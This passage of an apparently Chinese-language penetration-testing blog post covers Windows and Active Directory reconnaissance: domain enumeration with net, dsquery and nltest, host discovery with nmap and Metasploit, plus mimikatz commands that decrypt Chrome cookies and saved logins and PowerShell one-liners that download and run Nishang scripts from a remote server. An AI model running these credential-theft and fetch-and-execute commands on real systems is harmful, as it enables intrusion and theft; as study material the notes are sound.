class="title">LOGIND</span>~1&quot; <span class="title">exit</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">mimikatz.exe</span> <span class="title">privilege</span>::<span class="title">debug</span> <span class="title">log</span> &quot;<span class="title">dpapi</span>::<span class="title">chrome</span></span></span><br><span class="line"><span class="function">/<span class="title">in</span>:%<span class="title">localappdata</span>%\<span class="title">google</span>\<span class="title">chrome</span>\<span class="title">USERDA</span>~1\<span class="title">default</span>\<span class="title">cookies</span> /<span class="title">unprotect</span>&quot; <span class="title">exit</span></span></span><br></pre></td></tr></table></figure>
+
+<h6 id="powershell脚本"><a href="#powershell脚本" class="headerlink" title="powershell脚本"></a>powershell脚本</h6><p>Nishang-Gather-Get-Information.ps1</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang/blob/master/Gather/Get-Information.ps1">https://github.com/samratashok/nishang/blob/master/Gather/Get-Information.ps1</a></p>
+<p>脚本上传至VPS，开启HTTP让目标机器执行命令访问请求脚本</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell iex(new-object <span class="built_in">net</span>.webclient).downloadstring(&#x27;http://ip:port/GetInformation.ps1&#x27;);Get-Information</span><br></pre></td></tr></table></figure>
+
+<h6 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h6><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#scraper</span><br><span class="line">Meterpreter &gt; run scraper</span><br><span class="line">/root/.msf4/logs/scripts/scraper</span><br><span class="line"></span><br><span class="line">#winenum</span><br><span class="line">Meterpreter &gt; run winenum</span><br><span class="line">/root/.msf4/logs/scripts/winenum</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x03-域内信息收集"><a href="#0x03-域内信息收集" class="headerlink" title="0x03  域内信息收集"></a>0x03  域内信息收集</h2><h4 id="1-Net组件"><a href="#1-Net组件" class="headerlink" title="1.  Net组件"></a>1.  Net组件</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#查询域</span><br><span class="line"><span class="built_in">net</span> view /domain</span><br><span class="line"></span><br><span class="line">#查询域内的所有计算机</span><br><span class="line"><span class="built_in">net</span> view /domain:de1ay</span><br><span class="line"></span><br><span class="line">#查询域内所有用户组（Enterprise Admins组权限最大）</span><br><span class="line"><span class="built_in">net</span> group /domain</span><br><span class="line"></span><br><span class="line">#查看域管理员的用户组</span><br><span class="line"><span class="built_in">net</span> group &quot;domain admins&quot; /domain</span><br><span class="line"></span><br><span class="line">#查询所有域成员计算机列表</span><br><span class="line"><span class="built_in">net</span> group &quot;domain computers&quot; /domain</span><br><span class="line"></span><br><span class="line">#查询域系统管理员用户组</span><br><span class="line"><span class="built_in">net</span> group &quot;Enterprise admins&quot; /domain</span><br><span class="line"></span><br><span class="line">#查看域控制器</span><br><span class="line"><span class="built_in">net</span> group &quot;domain controllers&quot; /domain</span><br><span class="line"></span><br><span class="line">#对比查看&quot;工作站域DNS名称(域名)&quot;和&quot;登录域()域控制器&quot;的信息是否相匹配</span><br><span class="line"><span class="built_in">net</span> config workstation</span><br><span class="line"></span><br><span class="line">#查看域内所有账号</span><br><span class="line"><span class="built_in">net</span> user /domain</span><br><span class="line"></span><br><span class="line">#查询指定用户的详情信息</span><br><span class="line"><span class="built_in">net</span> user xxx /domain</span><br><span class="line"></span><br><span class="line">#查看时间可以找到域控</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> /domain</span><br><span class="line"></span><br><span class="line">#查看域密码策略</span><br><span class="line"><span class="built_in">net</span> accounts /domain</span><br><span class="line"></span><br><span class="line">#查看当前登录域</span><br><span class="line"><span class="built_in">net</span> config workstation</span><br><span class="line"></span><br><span class="line">#登录本机的域管理员</span><br><span class="line"><span class="built_in">net</span> localgroup administrators /domain</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-dsquery"><a href="#2-dsquery" class="headerlink" title="2.  dsquery"></a>2.  dsquery</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#查看当前域内的所有机器,dsquery工具一般在域控上才有,不过你可以上传一个dsquery</span><br><span class="line">dsquery computer</span><br><span class="line"></span><br><span class="line">#查看当前域中的所有账户名</span><br><span class="line">dsquery user</span><br><span class="line"></span><br><span class="line">#查看当前域内的所有组名</span><br><span class="line">dsquery group</span><br><span class="line"></span><br><span class="line">#查看到当前域所在的网段，结合nbtscan使用</span><br><span class="line">dsquery subnet</span><br><span class="line"></span><br><span class="line">#查看域内所有的web站点</span><br><span class="line">dsquery site</span><br><span class="line"></span><br><span class="line">#查看当前域中的服务器(一般结果只有域控的主机名)</span><br><span class="line">dsquery server</span><br><span class="line"></span><br><span class="line">#查询前<span class="number">240</span>个以admin开头的用户名</span><br><span class="line">dsquery user domainroot -name admin* -limit <span class="number">240</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="3-定位域控"><a href="#3-定位域控" class="headerlink" title="3.  定位域控"></a>3.  定位域控</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#<span class="built_in">ipconfig</span></span><br><span class="line"><span class="built_in">ipconfig</span> /all</span><br><span class="line"></span><br><span class="line">#查询dns解析记录</span><br><span class="line">nslookup -<span class="built_in">type</span>=all _ldap._tcp.dc._msdcs.de1ay.com</span><br><span class="line"></span><br><span class="line">#spn扫描</span><br><span class="line">#在SPN扫描结果中可以通过如下内容，来进行域控的定位。</span><br><span class="line">setspn -q */*</span><br><span class="line">setspn -T de1ay.com -q */*</span><br><span class="line">CN=DC,OU=Domain Controllers,DC=de1ay,DC=com</span><br><span class="line"></span><br><span class="line">#<span class="built_in">net</span> group</span><br><span class="line"><span class="built_in">net</span> group &quot;domain controllers&quot; /domain</span><br></pre></td></tr></table></figure>
+
+<h6 id="端口识别"><a href="#端口识别" class="headerlink" title="端口识别"></a>端口识别</h6><p>端口：389 </p>
+<p>服务：LDAP、ILS </p>
+<p>说明：轻型目录访问协议和NetMeeting Internet Locator Server共用这一端口。</p>
+<p>端口：53 </p>
+<p>服务：Domain Name Server（DNS） </p>
+<p>说明：53端口为DNS(Domain Name Server，域名服务器)服务器所开放，主要用于域名解析，DNS服务在NT 系统中使用的最为广泛。通过DNS服务器可以实现域名与IP地址之间的转换，只要记住域名就可以快速访问网站。</p>
+<h4 id="4-Other"><a href="#4-Other" class="headerlink" title="4.  Other"></a>4.  Other</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#查看域内信任关系</span><br><span class="line">nltest /domain_trusts</span><br><span class="line"></span><br><span class="line">#查看域控制器的机器名</span><br><span class="line">nltest /DCLIST:de1ay</span><br><span class="line"></span><br><span class="line">#查看域内邮件服务器</span><br><span class="line">nslookup -q=mx de1ay.com</span><br><span class="line"></span><br><span class="line">#查看域内DNS服务器</span><br><span class="line">nslookup -q=ns de1ay.com</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x04-内网存活探测"><a href="#0x04-内网存活探测" class="headerlink" title="0x04  内网存活探测"></a>0x04  内网存活探测</h2><h4 id="1-Netbios协议探测"><a href="#1-Netbios协议探测" class="headerlink" title="1.  Netbios协议探测"></a>1.  Netbios协议探测</h4><p>IBM公司开发，主要用于数十台计算机的小型局域网。该协议是一种在局域网上的程序可以使用的应用程序编程接 口（API），为程序提供了请求低级服务的同一的命令集，作用是为了给局域网提供网络以及其他特殊功能。系统 可以利用WINS服务、广播及Lmhost文件等多种模式将NetBIOS名-——特指基于NETBIOS协议获得计算机名 称——解析为相应IP地址，实现信息通讯，所以在局域网内部使用NetBIOS协议可以方便地实现消息通信及资源 的共享</p>
+<h6 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h6><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU -T4 --script nbstat.nse -p137 <span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="msf扫描"><a href="#msf扫描" class="headerlink" title="msf扫描"></a>msf扫描</h6><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/netbios/nbname</span><br></pre></td></tr></table></figure>
+
+<h6 id="Nbtscan"><a href="#Nbtscan" class="headerlink" title="Nbtscan"></a>Nbtscan</h6><p>项目地址：<a target="_blank" rel="noopener" href="http://www.unixwiz.net/tools/nbtscan.html">http://www.unixwiz.net/tools/nbtscan.html</a> </p>
+<p>使用nbtscan扫描本地或远程TCP/IP网络上开放的NetBIOS名称服务器 输出的结果第一列为IP地址，第二列为机器名和所在域的名称，第三列即最后一列为及其所开启的服务的列表</p>
+<h6 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h6><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nbtscan.exe –m <span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">0</span>/<span class="number">24</span></span><br><span class="line">nbtstat –n</span><br></pre></td></tr></table></figure>
+
+<h6 id="Lunix"><a href="#Lunix" class="headerlink" title="Lunix"></a>Lunix</h6><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan -r <span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="2-ICMP协议探测"><a href="#2-ICMP协议探测" class="headerlink" title="2.  ICMP协议探测"></a>2.  ICMP协议探测</h4><p>ICMP是TCP/IP协议族的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否 可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要 的作用。</p>
+<h6 id="nmap扫描-1"><a href="#nmap扫描-1" class="headerlink" title="nmap扫描"></a>nmap扫描</h6><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn -PE -T4 <span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">0</span>/<span class="number">24</span></span><br><span class="line">#  -sn: <span class="built_in">Ping</span> Scan - disable port scan</span><br><span class="line">#  -PE: ICMP <span class="built_in">echo</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="3-UDP协议探测"><a href="#3-UDP协议探测" class="headerlink" title="3.  UDP协议探测"></a>3.  UDP协议探测</h4><p>UDP是一种无连接的协议，在第四层-传输层，处于IP协议的上一层。UDP有不提供 数据包分组、组装和不能对数据包进行排序的缺点，也就是说，当报文发送之后，是无法得知其是否安全完整到达的。</p>
+<h6 id="nmap扫描-2"><a href="#nmap扫描-2" class="headerlink" title="nmap扫描"></a>nmap扫描</h6><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU –T4 -sV --max-retries <span class="number">1</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">100</span> -p <span class="number">500</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="msf扫描-1"><a href="#msf扫描-1" class="headerlink" title="msf扫描"></a>msf扫描</h6><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/discovery/udp_probe</span><br><span class="line">msf &gt; use auxiliary/scanner/discovery/udp_sweep</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-ARP协议探测"><a href="#4-ARP协议探测" class="headerlink" title="4.  ARP协议探测"></a>4.  ARP协议探测</h4><p>ARP,通过解析网路层地址来找寻数据链路层地址的一个在网络协议包中极其重要的网络传输协议。根据IP地址获取 物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到网络上的所有主机，并接收返回 消息，以此确定目标的物理地址</p>
+<h6 id="nmap扫描-3"><a href="#nmap扫描-3" class="headerlink" title="nmap扫描"></a>nmap扫描</h6><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn -PR <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="msf扫描-2"><a href="#msf扫描-2" class="headerlink" title="msf扫描"></a>msf扫描</h6><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/discovery/arp_sweep</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-SMB协议探测"><a href="#5-SMB协议探测" class="headerlink" title="5.  SMB协议探测"></a>5.  SMB协议探测</h4><h6 id="msf扫描-3"><a href="#msf扫描-3" class="headerlink" title="msf扫描"></a>msf扫描</h6><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/smb/smb_version</span><br></pre></td></tr></table></figure>
+
+<h4 id="6-端口探测"><a href="#6-端口探测" class="headerlink" title="6.  端口探测"></a>6.  端口探测</h4><p>MSF中的portscan模块 </p>
+<p>nmap </p>
+<p>Nishang中的Invoke-PortScan模块 端口扫描，默认扫描常见端口，也可以用 -Port指定端口： </p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell iex(new-object <span class="built_in">net</span>.webclient).downloadstring(&#x27;http://<span class="number">47</span>.<span class="number">104</span>.<span class="number">255</span>.<span class="number">11</span>:<span class="number">8000</span>/Invoke-PortScan.ps1&#x27;);InvokePortScan -StartAddress <span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">1</span> -EndAddress <span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">255</span> -ResolveHost -ScanPort</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+  <div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+  
+</div>
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="成殇Orz1 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.png" alt="成殇Orz1 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>成殇Orz1
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://onlycare.github.io/2021/02/25/Windows%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="Windows主机信息收集">http://onlycare.github.io/2021/02/25/Windows主机信息收集/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"><i class="fa fa-tags"></i>渗透测试</a>
+              <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag"><i class="fa fa-tags"></i>信息收集</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/02/24/CORS/" rel="prev" title="CORS">
+      <i class="fa fa-chevron-left"></i> CORS
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%88%90%E6%AE%87Orz1"><span class="nav-text">成殇Orz1</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E4%BB%80%E4%B9%88%E6%98%AF%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="nav-text">0x00  什么是内网渗透</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%B8%B8%E8%A7%81%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A"><span class="nav-text">0x01  常见名词解释</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%B7%A5%E4%BD%9C%E7%BB%84"><span class="nav-text">1. 工作组</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%9F%9F"><span class="nav-text">2.  域</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%9F-Domain"><span class="nav-text">域  Domain</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8-Domain-Controller"><span class="nav-text">域控制器  Domain Controller</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%88%B6%E5%9F%9F%E5%92%8C%E5%AD%90%E5%9F%9F"><span class="nav-text">父域和子域</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%9F%E6%A0%91"><span class="nav-text">域树</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%9F%E6%9E%97"><span class="nav-text">域林</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95"><span class="nav-text">3.  活动目录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-DMZ"><span class="nav-text">4.  DMZ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E5%9F%9F%E5%86%85%E7%9A%84%E5%90%84%E7%A7%8D%E6%9D%83%E9%99%90"><span class="nav-text">5.  域内的各种权限</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">0x02  工作组信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1.  用户信息收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">2.  系统信息收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">3.  网络信息收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-%E9%98%B2%E7%81%AB%E5%A2%99%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">4.  防火墙信息收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-%E4%BB%A3%E7%90%86%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">5.  代理信息收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-%E5%85%B6%E4%BB%96%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">6.  其他信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#powershell%E8%84%9A%E6%9C%AC"><span class="nav-text">powershell脚本</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#metasploit"><span class="nav-text">metasploit</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">0x03  域内信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-Net%E7%BB%84%E4%BB%B6"><span class="nav-text">1.  Net组件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-dsquery"><span class="nav-text">2.  dsquery</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E5%AE%9A%E4%BD%8D%E5%9F%9F%E6%8E%A7"><span class="nav-text">3.  定位域控</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E8%AF%86%E5%88%AB"><span class="nav-text">端口识别</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-Other"><span class="nav-text">4.  Other</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E6%8E%A2%E6%B5%8B"><span class="nav-text">0x04  内网存活探测</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-Netbios%E5%8D%8F%E8%AE%AE%E6%8E%A2%E6%B5%8B"><span class="nav-text">1.  Netbios协议探测</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#nmap%E6%89%AB%E6%8F%8F"><span class="nav-text">nmap扫描</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#msf%E6%89%AB%E6%8F%8F"><span class="nav-text">msf扫描</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Nbtscan"><span class="nav-text">Nbtscan</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Windows"><span class="nav-text">Windows</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Lunix"><span class="nav-text">Lunix</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-ICMP%E5%8D%8F%E8%AE%AE%E6%8E%A2%E6%B5%8B"><span class="nav-text">2.  ICMP协议探测</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#nmap%E6%89%AB%E6%8F%8F-1"><span class="nav-text">nmap扫描</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-UDP%E5%8D%8F%E8%AE%AE%E6%8E%A2%E6%B5%8B"><span class="nav-text">3.  UDP协议探测</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#nmap%E6%89%AB%E6%8F%8F-2"><span class="nav-text">nmap扫描</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#msf%E6%89%AB%E6%8F%8F-1"><span class="nav-text">msf扫描</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-ARP%E5%8D%8F%E8%AE%AE%E6%8E%A2%E6%B5%8B"><span class="nav-text">4.  ARP协议探测</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#nmap%E6%89%AB%E6%8F%8F-3"><span class="nav-text">nmap扫描</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#msf%E6%89%AB%E6%8F%8F-2"><span class="nav-text">msf扫描</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-SMB%E5%8D%8F%E8%AE%AE%E6%8E%A2%E6%B5%8B"><span class="nav-text">5.  SMB协议探测</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#msf%E6%89%AB%E6%8F%8F-3"><span class="nav-text">msf扫描</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="nav-text">6.  端口探测</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="成殇Orz1"
+      src="/images/2.png">
+  <p class="site-author-name" itemprop="name">成殇Orz1</p>
+  <div class="site-description" itemprop="description">菜鸡一枚</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/onlycare" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;onlycare" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:cshanng@gmail.com" title="E-Mail → mailto:cshanng@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">成殇Orz1</span>
